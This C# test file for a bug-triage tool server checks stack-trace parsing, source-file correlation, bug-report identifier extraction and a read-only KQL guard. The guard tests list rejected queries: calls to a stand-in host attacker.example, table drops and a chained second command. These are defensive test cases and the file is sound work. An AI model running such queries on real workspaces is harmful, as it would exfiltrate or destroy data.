using Risebird.Mcp.BugTriage.Services;
using Risebird.Mcp.BugTriage.Tools;

namespace Risebird.Mcp.BugTriage.Tests;

/// <summary>
/// Stack frame parsing and source correlation - the part that turns telemetry into a file and line.
/// </summary>
public sealed class StackTraceParsingTests
{
    [Fact]
    public void ParsesFrameWithFileAndLine()
    {
        const string trace =
            @"   at Risebird.Business.UserService.GetUser(Int32 id) in D:\a\1\s\Risebird.Business\UserService.cs:line 42";

        var frames = RepositoryService.ParseStackTrace(trace);

        var frame = Assert.Single(frames);
        Assert.Equal("Risebird.Business.UserService", frame.DeclaringType);
        Assert.Equal(@"D:\a\1\s\Risebird.Business\UserService.cs", frame.BuildFilePath);
        Assert.Equal(42, frame.Line);
    }

    [Fact]
    public void ParsesFrameWithoutFileInformation()
    {
        var frames = RepositoryService.ParseStackTrace("   at Risebird.Web.HomeController.Index()");

        var frame = Assert.Single(frames);
        Assert.Equal("Risebird.Web.HomeController", frame.DeclaringType);
        Assert.Null(frame.BuildFilePath);
        Assert.Null(frame.Line);
    }

    [Fact]
    public void ExtractsDeclaringTypeFromAsyncStateMachineFrame()
    {
        // Async methods surface as a compiler-generated nested type; the useful name is before the '+'.
        var frames = RepositoryService.ParseStackTrace(
            "   at Risebird.Business.MailService+<SendAsync>d__12.MoveNext()");

        Assert.Equal("Risebird.Business.MailService", Assert.Single(frames).DeclaringType);
    }

    [Fact]
    public void IgnoresNonFrameLines()
    {
        const string trace = """
            System.NullReferenceException: Object reference not set to an instance of an object.
               at Risebird.Business.UserService.GetUser(Int32 id)
            --- End of stack trace from previous location ---
            """;

        Assert.Single(RepositoryService.ParseStackTrace(trace));
    }

    [Fact]
    public void ResolvesBuildAgentPathOntoTheLocalCheckoutBySuffix()
    {
        using var sandbox = new SandboxRepository();
        sandbox.WriteFile(@"Risebird.Business\UserService.cs", "line1\nline2\nline3\nline4\nline5\n");
        var repository = sandbox.CreateRepositoryService();

        var frames = RepositoryService.ParseStackTrace(
            @"   at Risebird.Business.UserService.GetUser(Int32 id) in D:\agent\_work\1\s\Risebird.Business\UserService.cs:line 3");

        var resolved = Assert.Single(repository.ResolveFrames(frames, contextLines: 1));

        Assert.Equal(@"Risebird.Business\UserService.cs", resolved.RepositoryPath);
        Assert.Equal("matched by build path suffix", resolved.Resolution);
        Assert.Contains("line3", resolved.Source);
    }

    [Fact]
    public void FallsBackToTypeNameWhenNoPathWasRecorded()
    {
        using var sandbox = new SandboxRepository();
        sandbox.WriteFile(@"Risebird.Business\WalletService.cs", "// content");
        var repository = sandbox.CreateRepositoryService();

        var frames = RepositoryService.ParseStackTrace("   at Risebird.Business.WalletService.Debit(Decimal amount)");
        var resolved = Assert.Single(repository.ResolveFrames(frames, contextLines: 0));

        Assert.Equal(@"Risebird.Business\WalletService.cs", resolved.RepositoryPath);
        Assert.Equal("matched by type name", resolved.Resolution);
    }

    [Fact]
    public void ReportsAmbiguityRatherThanGuessingBetweenIdenticallyNamedFiles()
    {
        using var sandbox = new SandboxRepository();
        sandbox.WriteFile(@"ProjectA\Helper.cs", "// a");
        sandbox.WriteFile(@"ProjectB\Helper.cs", "// b");
        var repository = sandbox.CreateRepositoryService();

        var frames = RepositoryService.ParseStackTrace("   at Something.Helper.Do()");
        var resolved = Assert.Single(repository.ResolveFrames(frames, contextLines: 0));

        Assert.Null(resolved.RepositoryPath);
        Assert.Contains("ambiguous", resolved.Resolution);
        Assert.Equal(2, resolved.AlternateCandidates!.Count);
    }

    [Fact]
    public void DoesNotResolveFramesOntoBuildArtifacts()
    {
        using var sandbox = new SandboxRepository();
        sandbox.WriteFile(@"src\bin\Debug\Orphan.cs", "// compiled output");
        var repository = sandbox.CreateRepositoryService();

        var frames = RepositoryService.ParseStackTrace("   at Something.Orphan.Do()");
        var resolved = Assert.Single(repository.ResolveFrames(frames, contextLines: 0));

        Assert.Null(resolved.RepositoryPath);
    }
}

/// <summary>Extraction from free-form human bug reports.</summary>
public sealed class BugReportExtractionTests
{
    private const string Report = """
        The feedback page at https://portal.risebird.io/Interview/Feedback?id=8891 returns status 500.
        System.NullReferenceException: Object reference not set to an instance of an object.
           at Risebird.Business.InterviewerService.BuildSummary(Int32 id) in D:\a\1\s\Risebird.Business\InterviewerService.cs:line 214
        operation id 4f9c1a2b3d4e5f60718293a4b5c6d7e8, tenant 550e8400-e29b-41d4-a716-446655440000. Related to #4471.
        """;

    [Fact]
    public void ExtractsTheIdentifiersAnAgentCanActOn()
    {
        var json = BugReportTools.AnalyzeBugReport(Report);

        Assert.Contains("NullReferenceException", json);
        Assert.Contains("InterviewerService", json);
        Assert.Contains("4f9c1a2b3d4e5f60718293a4b5c6d7e8", json);
        Assert.Contains("500", json);
        Assert.Contains("4471", json);
        Assert.Contains("portal.risebird.io/Interview/Feedback", json);
    }

    [Fact]
    public void SeparatesThe32HexOperationIdFromADashedGuid()
    {
        var json = BugReportTools.AnalyzeBugReport(Report);

        // The dashed GUID is a tenant id, not an operation id; they must not be conflated.
        var operationIdsSection = json[json.IndexOf("operationIds", StringComparison.Ordinal)..];
        var otherGuidsIndex = operationIdsSection.IndexOf("otherGuids", StringComparison.Ordinal);

        Assert.Contains("4f9c1a2b3d4e5f60718293a4b5c6d7e8", operationIdsSection[..otherGuidsIndex]);
        Assert.Contains("550e8400-e29b-41d4-a716-446655440000", operationIdsSection[otherGuidsIndex..]);
    }

    [Fact]
    public void SuggestsResolvingTheStackTraceFirstWhenOneIsPresent()
    {
        var json = BugReportTools.AnalyzeBugReport(Report);

        Assert.Contains("resolve_stack_trace", json);
    }

    [Fact]
    public void SaysSoWhenThereIsNothingActionable()
    {
        var json = BugReportTools.AnalyzeBugReport("it is broken again, please look");

        Assert.Contains("Nothing machine-actionable", json);
    }

    [Fact]
    public void HandlesEmptyInput()
    {
        Assert.Contains("empty", BugReportTools.AnalyzeBugReport("   "));
    }
}

/// <summary>The read-only guard on ad-hoc KQL.</summary>
public sealed class KqlGuardTests
{
    [Theory]
    [InlineData("exceptions | evaluate http_request('http://attacker.example')")]
    [InlineData(@"externaldata(x:string) [@'https://attacker.example/x.csv']")]
    [InlineData(".create table Foo (a:string)")]
    [InlineData("exceptions | take 10; .drop table exceptions")]
    [InlineData(".append exceptions <| datatable(x:string)['a']")]
    public void RejectsQueriesThatReachOutsideTheWorkspace(string kql)
    {
        var ex = Assert.Throws<InvalidOperationException>(() => AppInsightsService.ValidateKql(kql));
        Assert.Contains("not allowed", ex.Message);
    }

    [Theory]
    [InlineData("exceptions | where timestamp > ago(24h) | take 10")]
    [InlineData("requests | summarize count() by name | top 5 by count_")]
    public void AllowsOrdinaryReadQueries(string kql)
    {
        AppInsightsService.ValidateKql(kql);
    }

    [Fact]
    public void EscapesQuotesAndBackslashesInStringLiterals()
    {
        Assert.Equal(@"a\\b\""c", AppInsightsService.EscapeKqlString(@"a\b""c"));
    }
}
